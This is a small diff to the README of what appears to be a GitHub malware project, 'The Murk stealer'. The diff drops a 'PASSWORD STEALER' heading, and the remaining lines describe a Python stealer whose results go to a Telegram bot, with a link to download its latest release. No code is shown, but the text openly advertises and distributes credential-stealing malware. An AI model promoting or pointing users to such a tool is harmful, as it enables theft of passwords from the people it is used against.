@@ -1,6 +1,5 @@
 <a id ="up"></a>
 ![LOGO](Images_GitHub/pxfulllogo.png)
-PASSWORD STEALER
 ---
 Stealer written on Python, results will be sent to Telegram bot.
 [Download the latest release](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v4.0.1)
